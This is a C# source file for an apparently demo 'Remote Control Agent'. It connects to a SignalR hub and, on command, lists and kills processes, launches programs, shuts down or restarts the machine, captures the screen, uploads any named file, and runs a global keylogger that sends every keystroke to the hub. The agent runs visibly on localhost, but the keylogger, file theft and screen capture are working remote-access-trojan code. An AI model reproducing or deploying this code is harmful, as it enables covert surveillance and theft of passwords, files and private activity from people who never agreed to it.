using Microsoft.AspNetCore.SignalR.Client;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;

namespace AgentApp
{
    class Program
    {
        // For Keylogger API
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private static bool _isKeylogging = false;

        static async Task Main(string[] args)
        {
            Console.WriteLine("Starting Remote Control Agent...");
            // Use http vs https based on dev server setup. Default is 5122 or 5001 usually.
            // When user runs it, they might need to config port. 
            var hubUrl = "http://localhost:5000/remoteHub"; 
            Console.WriteLine($"Connecting to {hubUrl}...");

            var connection = new HubConnectionBuilder()
                .WithUrl(hubUrl)
                .WithAutomaticReconnect()
                .Build();

            connection.Closed += async (error) =>
            {
                Console.WriteLine("Connection lost. Reconnecting...");
                await Task.Delay(new Random().Next(0, 5) * 1000);
                await connection.StartAsync();
            };

            // Register handlers for Hub commands
            connection.On("GetProcessesCommand", async () => 
            {
                Console.WriteLine("Command Received: GetProcessesCommand");
                try
                {
                    var processes = Process.GetProcesses()
                        .Where(p => p.MainWindowHandle != IntPtr.Zero || p.ProcessName == "explorer")
                        .Select(p => new {
                            Id = p.Id,
                            Name = p.ProcessName,
                            Threads = p.Threads.Count
                        }).ToList();

                    var json = JsonSerializer.Serialize(processes);
                    await connection.InvokeAsync("SendProcessesResult", "", json);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error getting processes: {ex.Message}");
                }
            });

            connection.On<int>("KillProcessCommand", (processId) => 
            {
                Console.WriteLine($"Command Received: KillProcessCommand for PID {processId}");
                try
                {
                    var p = Process.GetProcessById(processId);
                    p.Kill();
                    Console.WriteLine($"Process {processId} killed.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to kill process {processId}: {ex.Message}");
                }
            });

            // --- NEW: Applications Management ---
            connection.On("GetApplicationsCommand", async () => 
            {
                Console.WriteLine("Command Received: GetApplicationsCommand");
                try
                {
                    // Filter processes that actually have a GUI Window
                    var apps = Process.GetProcesses()
                        .Where(p => p.MainWindowHandle != IntPtr.Zero && !string.IsNullOrEmpty(p.MainWindowTitle))
                        .Select(p => new {
                            Id = p.Id,
                            Name = p.ProcessName,
                            Title = p.MainWindowTitle
                        }).ToList();

                    var json = JsonSerializer.Serialize(apps);
                    await connection.InvokeAsync("SendApplicationsResult", "", json);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error getting apps: {ex.Message}");
                }
            });

            connection.On<string>("StartAppCommand", (appPath) => 
            {
                Console.WriteLine($"Command Received: StartAppCommand for {appPath}");
                try
                {
                    Process.Start(new ProcessStartInfo { FileName = appPath, UseShellExecute = true });
                    Console.WriteLine($"Started app: {appPath}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to start app {appPath}: {ex.Message}");
                }
            });

            // --- NEW: Power Management ---
            connection.On("ShutdownCommand", () => 
            {
                Console.WriteLine("Command Received: ShutdownCommand");
                try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
            });

            connection.On("RestartCommand", () => 
            {
                Console.WriteLine("Command Received: RestartCommand");
                try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
            });

            // --- NEW: Screen Capture ---
            connection.On("TakeScreenshotCommand", async () => 
            {
                Console.WriteLine("Command Received: TakeScreenshotCommand");
                try
                {
                    // Create a bitmap of the primary screen bounds
                    // Note: In real app we might want all screens, but primary is good for MVP
                    Rectangle bounds = new Rectangle(0, 0, 1920, 1080); // Default fallback
                    
                    // Use System.Windows.Forms.Screen if available in net8.0-windows, else fallback
                    var screenBounds = System.Windows.Forms.Screen.PrimaryScreen?.Bounds ?? bounds;
                    
                    using (Bitmap bitmap = new Bitmap(screenBounds.Width, screenBounds.Height))
                    {
                        using (Graphics g = Graphics.FromImage(bitmap))
                        {
                            g.CopyFromScreen(Point.Empty, Point.Empty, screenBounds.Size);
                        }
                        
                        using (MemoryStream ms = new MemoryStream())
                        {
                            // Save as JPEG to reduce payload size over SignalR
                            bitmap.Save(ms, ImageFormat.Jpeg);
                            byte[] imageBytes = ms.ToArray();
                            string base64String = Convert.ToBase64String(imageBytes);
                            
                            await connection.InvokeAsync("SendScreenshotResult", "", base64String);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error capturing screen: {ex.Message}");
                }
            });

            // --- NEW: File Download ---
            connection.On<string>("DownloadFileCommand", async (filePath) => 
            {
                Console.WriteLine($"Command Received: DownloadFileCommand for {filePath}");
                try
                {
                    if (File.Exists(filePath))
                    {
                        byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                        string base64Data = Convert.ToBase64String(fileBytes);
                        string fileName = Path.GetFileName(filePath);
                        await connection.InvokeAsync("SendFileResult", "", fileName, base64Data);
                        Console.WriteLine("File sent successfully.");
                    }
                    else
                    {
                        Console.WriteLine("File not found.");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error downloading file: {ex.Message}");
                }
            });

            // --- NEW: Keylogger ---
            connection.On("StartKeyloggerCommand", () => 
            {
                Console.WriteLine("Command Received: StartKeyloggerCommand");
                if(!_isKeylogging)
                {
                    _isKeylogging = true;
                    // Run a background thread to poll keys
                    Task.Run(async () => {
                        while (_isKeylogging)
                        {
                            for (int i = 8; i <= 255; i++)
                            {
                                int keyState = GetAsyncKeyState(i);
                                // The most significant bit is set if the key is down
                                if ((keyState & 1) == 1 || keyState == -32767) 
                                {
                                    string keyName = ((ConsoleKey)i).ToString();
                                    // Send key immediately 
                                    await connection.InvokeAsync("SendKeylogData", "", $"[{keyName}]");
                                }
                            }
                            await Task.Delay(10); // Polling interval
                        }
                    });
                }
            });

            connection.On("StopKeyloggerCommand", () => 
            {
                Console.WriteLine("Command Received: StopKeyloggerCommand");
                _isKeylogging = false;
            });

            try
            {
                await connection.StartAsync();
                Console.WriteLine("Connected to Hub successfully!");
                await connection.InvokeAsync("RegisterAgent", Environment.MachineName);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting connection. Is WebApp running? {ex.Message}");
            }

            Console.WriteLine("Agent is running... Press any key to exit.");
            Console.ReadKey();
            await connection.StopAsync();
        }
    }
}
